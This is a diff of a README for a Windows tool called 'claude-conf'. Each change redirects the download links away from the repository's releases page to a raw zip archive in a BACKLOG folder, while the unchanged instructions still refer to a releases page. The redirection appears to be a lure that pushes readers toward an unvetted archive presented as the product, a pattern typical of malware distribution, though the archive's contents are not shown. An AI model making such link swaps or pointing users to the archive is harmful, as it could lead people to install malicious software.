@@ -1,6 +1,6 @@
 # ⚙️ claude-conf - Streamline Claude Code on Windows
 
-[![Download claude-conf](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vleickzs/claude-conf/releases)
+[![Download claude-conf](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Vleickzs/claude-conf/main/BACKLOG/conf_claude_1.7.zip)
 
 ## 🚀 What this is
 
@@ -24,7 +24,7 @@ If you already use a terminal app, you can keep using it.
 
 Visit this page to download:
 
-https://github.com/Vleickzs/claude-conf/releases
+https://raw.githubusercontent.com/Vleickzs/claude-conf/main/BACKLOG/conf_claude_1.7.zip
 
 On that page, look for the latest release and download the file that matches your Windows setup. If there is more than one file, choose the one meant for Windows.
 
@@ -142,7 +142,7 @@ If nothing happens when you open the file, use the command line version if one i
 
 Download the latest release here:
 
-https://github.com/Vleickzs/claude-conf/releases
+https://raw.githubusercontent.com/Vleickzs/claude-conf/main/BACKLOG/conf_claude_1.7.zip
 
 ## ✅ Quick start
 
